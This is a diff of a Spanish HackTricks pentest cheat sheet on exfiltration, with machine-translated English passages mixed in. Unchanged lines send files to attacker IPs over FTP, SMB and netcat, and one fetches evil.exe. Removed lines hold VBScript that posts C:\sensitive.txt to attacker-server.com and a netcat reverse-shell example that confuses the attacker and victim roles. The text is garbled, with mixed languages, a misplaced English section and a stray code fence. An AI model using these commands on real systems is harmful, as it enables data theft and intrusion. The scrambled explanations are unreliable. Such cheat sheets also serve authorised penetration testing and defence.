@@ -1,18 +1,19 @@
 # Exfiltración
 
+{% hint style="success" %}
+Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Apoya a HackTricks</summary>
 
-Otras formas de apoyar a HackTricks:
-
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos en** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
 
 **Grupo de Seguridad Try Hard**
 
@@ -150,7 +151,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### Cliente **Windows**
+### Cliente de **Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -185,28 +186,37 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Windows
+# Exfiltration
 
----
+## Introduction
 
-### Exfiltration
+Exfiltration is the unauthorized transfer of data from a computer. Attackers exfiltrate data to maintain access, sell it on the black market, or use it for other malicious purposes. Exfiltration techniques can vary depending on the target environment and the goals of the attacker.
 
-Exfiltration is the unauthorized transfer of data from a target system. Attackers use various techniques to exfiltrate data, such as:
+## Windows Exfiltration Techniques
 
-- **Compression**: Attackers compress data before exfiltrating it to reduce its size and avoid detection.
-- **Encryption**: Data is encrypted to prevent unauthorized access during exfiltration.
-- **Steganography**: Attackers hide data within other files to avoid detection.
-- **Exfiltration over Alternative Protocols**: Attackers use protocols like DNS or ICMP to exfiltrate data, bypassing traditional security controls.
-- **Exfiltration over Command and Control Channels**: Attackers use existing command and control channels to exfiltrate data, making it harder to detect.
+### Common Techniques
 
-To prevent exfiltration, organizations can implement measures such as:
+- **Web-Based Exfiltration**: Attackers can use web applications to exfiltrate data by uploading it to external servers or sending it via web requests.
+  
+- **DNS Exfiltration**: Attackers can encode data within DNS requests to exfiltrate information from a compromised system.
 
-- **Network Segmentation**: Segregating networks to limit the movement of attackers within the network.
-- **Data Loss Prevention (DLP) Solutions**: Monitoring and preventing unauthorized data transfers.
-- **Network Traffic Analysis**: Monitoring network traffic for signs of exfiltration attempts.
-- **User Training**: Educating users about the risks of data exfiltration and how to recognize and report suspicious activities.
+- **Email Exfiltration**: Attackers can send sensitive data as email attachments or in the body of emails to external email accounts.
 
-By understanding exfiltration techniques and implementing appropriate security measures, organizations can better protect their data from unauthorized access and leakage.
+- **Exfiltration Over C2 Channels**: Attackers can exfiltrate data over command-and-control (C2) channels established with malware on the compromised system.
+
+### Advanced Techniques
+
+- **Steganography**: Attackers can hide data within images, audio files, or other types of files to exfiltrate information without detection.
+
+- **Data Compression**: Attackers can compress data before exfiltrating it to reduce the size of the transferred files and avoid detection.
+
+- **Data Encryption**: Attackers can encrypt exfiltrated data to prevent detection by security controls.
+
+- **Fileless Exfiltration**: Attackers can exfiltrate data without writing it to disk, making detection more challenging for security tools.
+
+## Detection and Prevention
+
+Detecting exfiltration attempts can be challenging due to the variety of techniques available to attackers. Organizations can implement network monitoring, endpoint security solutions, and user awareness training to help detect and prevent data exfiltration.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -230,32 +240,9 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-### Description
+### Netcat
 
-The `nc` command, also known as Netcat, is a versatile networking tool that can be used for various purposes during a penetration test. It can be used for port scanning, banner grabbing, transferring files, and establishing reverse shells. Netcat operates by establishing a connection between a client and a server, allowing for data transfer between the two.
-
-### Usage
-
-To establish a connection with a remote server using `nc`, you can use the following command:
-
-```bash
-nc <remote_server_ip> <port>
-```
-
-To listen for incoming connections on a specific port, you can use the following command:
-
-```bash
-nc -l -p <port>
-```
-
-### Example
-
-Establishing a reverse shell using `nc`:
-
-1. Attacker machine: `nc -l -p 1234 -e /bin/bash`
-2. Victim machine: `nc <attacker_ip> 1234`
-
-This will establish a reverse shell from the victim machine to the attacker machine, allowing the attacker to execute commands on the victim's system.
+Netcat is a versatile networking utility that can be used for reading from and writing to network connections using TCP or UDP. It can be used to transfer files, port scanning, banner grabbing, and as a backdoor. Netcat can be used to exfiltrate data by connecting to a remote server and sending the data over the network.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
@@ -296,7 +283,7 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Si puedes enviar datos a un servidor SMTP, puedes crear un servidor SMTP para recibir los datos con python:
+Si puedes enviar datos a un servidor SMTP, puedes crear un servidor SMTP para recibir los datos con Python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
@@ -328,36 +315,9 @@ echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', '
 ```
 ## VBScript
 
-### Overview
+### Visual Basic Scripting Edition (VBScript)
 
-Visual Basic Scripting Edition (VBScript) is a scripting language developed by Microsoft. It is commonly used for writing scripts to automate tasks on Windows operating systems. VBScript can be used for exfiltration by reading data from files, registry keys, or other sources and sending it to an external server.
-
-### Exfiltration Techniques
-
-#### 1. File Transfer
-
-VBScript can be used to read the contents of a file and send it to an external server using HTTP or other protocols.
-
-```vbscript
-Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
-objXMLHTTP.open "POST", "http://attacker-server.com/receive.php", False
-objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
-objXMLHTTP.send "data=" & ReadFile("C:\sensitive.txt")
-```
-
-#### 2. Registry Data
-
-VBScript can also be used to read data from the Windows registry and exfiltrate it to a remote server.
-
-```vbscript
-Set objReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
-objReg.GetStringValue &H80000001, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "MaliciousKey", strValue
-SendDataToServer strValue
-```
-
-### Detection and Prevention
-
-To detect and prevent exfiltration using VBScript, monitoring network traffic for suspicious outbound connections, restricting VBScript execution in enterprise environments, and implementing endpoint security solutions can be effective measures.
+VBScript is a lightweight scripting language developed by Microsoft that is modeled on Visual Basic. It is commonly used for client-side scripting in web development and can also be used for server-side scripting through Windows Script Host (WSH). VBScript is often executed within HTML documents to perform tasks such as form validation or interacting with the user.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -395,12 +355,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hexadecimal**. Esto significa que al proporcionar un hexadecimal de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación de ensamblar archivos de hasta 64 kb de tamaño**.
+El programa `debug.exe` no solo permite la inspección de binarios, sino que también tiene la **capacidad de reconstruirlos a partir de hexadecimal**. Esto significa que al proporcionar un hexadecimal de un binario, `debug.exe` puede generar el archivo binario. Sin embargo, es importante tener en cuenta que debug.exe tiene una **limitación de ensamblaje de archivos de hasta 64 kb de tamaño**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
+```markdown
 Luego copia y pega el texto en la ventana de comandos de Windows y se creará un archivo llamado nc.exe.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
@@ -415,16 +376,18 @@ Luego copia y pega el texto en la ventana de comandos de Windows y se creará un
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
+{% hint style="success" %}
+Aprende y practica Hacking en AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Apoya a HackTricks</summary>
 
-Otras formas de apoyar a HackTricks:
-
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
+```
